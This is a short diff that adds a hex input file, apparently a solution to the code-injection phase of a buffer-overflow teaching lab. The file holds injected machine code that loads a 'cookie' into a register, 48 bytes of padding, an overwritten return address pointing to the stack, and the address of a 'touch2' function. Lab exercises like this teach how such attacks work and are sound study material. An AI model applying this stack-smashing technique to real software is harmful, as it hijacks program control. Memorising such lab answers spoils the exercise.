@@ -1,0 +1,9 @@
+48 c7 c7 eb 30 0b 73 c3  /* My cookie */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* 48 bytes are just padding */
+78 a9 66 55 00 00 00 00 /* address of register %rsp */
+6e 14 40 00 00 00 00 00 /* address of touch2 function */
